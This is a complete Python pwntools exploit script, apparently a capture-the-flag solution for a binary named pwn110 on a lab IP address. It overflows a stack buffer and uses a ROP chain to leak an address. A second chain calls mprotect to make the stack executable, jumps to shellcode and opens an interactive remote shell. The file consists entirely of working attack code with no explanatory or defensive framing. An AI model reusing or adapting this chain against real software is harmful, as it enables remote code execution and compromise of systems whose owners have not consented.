from pwn import *
import warnings

warnings.filterwarnings('ignore')

address = '10.10.223.96'
port = 9010

context.log_level = 'critical'
context.arch = 'amd64'
context.binary = binary = ELF('./pwn110.pwn110')
rop = ROP(binary)

pop_rdi_ret = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
pop_rsi_ret = p64(rop.find_gadget(['pop rsi', 'ret'])[0])
pop_rdx_ret = p64(rop.find_gadget(['pop rdx', 'ret'])[0])
jmp_rsp = p64(0x0000000000463c43)

mprotect_addr = p64(binary.symbols.mprotect)
puts_addr = p64(binary.symbols.puts)
main_addr = p64(binary.symbols.main)

libc_stack_end = p64(0x004bfa70)
page_size = 0x1000

overflow = b'A' * 0x28
shellcode = asm(shellcraft.sh())

payload1 = overflow
payload1 += pop_rdi_ret
payload1 += libc_stack_end
payload1 += puts_addr
payload1 += main_addr


with remote(address, port) as target:
	target.sendlineafter('Well done, Now try to pwn me without libc ğŸ˜', payload1)
	target.recvline()

	libc_stack_end_value = u64(target.recvline().strip().ljust(8, b'\x00'))
	success(f'Leaked address: {hex(libc_stack_end_value)}')

	beginning_of_page = p64(libc_stack_end_value&~0xfff)

	payload2 = overflow
	payload2 += pop_rdi_ret
	payload2 += beginning_of_page
	payload2 += pop_rsi_ret
	payload2 += p64(0x1000)
	payload2 += pop_rdx_ret
	payload2 += p64(0x7)
	payload2 += mprotect_addr
	payload2 += jmp_rsp
	payload2 += shellcode

	target.sendlineafter('Well done, Now try to pwn me without libc ğŸ˜', payload2)
	target.interactive()
